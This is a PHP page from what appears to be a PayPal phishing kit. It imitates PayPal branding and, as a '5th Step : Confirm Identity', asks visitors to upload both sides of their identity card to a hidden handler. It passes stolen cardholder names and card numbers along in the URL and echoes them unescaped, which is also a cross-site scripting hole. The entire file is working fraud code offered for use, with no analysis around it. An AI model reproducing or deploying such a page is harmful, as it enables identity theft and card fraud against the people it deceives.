<?php error_reporting(0); ?>
<!DOCTYPE html>
<html>
  <head>
    <head>
      <meta charset="utf-8">
      <title> Verify your Paypal Account Informations </title>
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <script src="../js/ajax.js" charset="utf-8"></script>
      <script src="../js/jquery.js" charset="utf-8"></script>
      <script src="../js/jquery.min.js" charset="utf-8"></script>
      <script type="text/javascript" src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
      <link rel="stylesheet" href="../css/styles.css">
      <link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
      <link href="https://file.myfontastic.com/hSMyDca9BDwBA8GgvxRZRP/icons.css" rel="stylesheet">
    </head>
  </head>
  <body>
    <div class="bg"></div>
    <a href="./"><div class="logo"></div></a>
    <div class="panels bottom" id="former">
      <div class="profils">
        <div class="img">
          <img src="unknown.jpg" class="avatar">
        </div>
        <br>
        <div class="name holder"><?php echo $_GET['holder']; ?></div>
        <br>
        <br>
        <div class="name cc"><?php echo $_GET['cc']; ?></div>
      </div>
      <br>
      <form class="description" style="text-align: center;" id="idform" action="ajax/identity.php?holder=<?php echo $_GET['holder'] ?>&cc=<?php echo $_GET['cc'] ?>" enctype="multipart/form-data" method="post" autocomplete="off">
        <h3>5<sup>th</sup> Step : Confirm Identity </h3>
        <div class="id_slide">
          <img src="identity.png" name="identitimg" class="id_img face">
        </div>
        <b name='return_text'> PLease Upload Your Identity Card's Face</b>
        <br>
        <div class="btns" style="margin-top: 15px;" name="id_upload">
          Chose Picture
          <div class="children"></div>
        </div>
        <input type="file" name="upload_idface" alt="dead" value style="display: none;" accept="image/*">
        <input type="file" name="upload_idback" alt="dead" value style="display: none;" accept="image/*">
      </form>
      <div class="loader" id="loader">
        <div class="load"></div>
      </div>
    </div>
    <script type="text/javascript">
      <?php include '../js/js-plus.js'; ?>
    </script>
  </body>
</html>
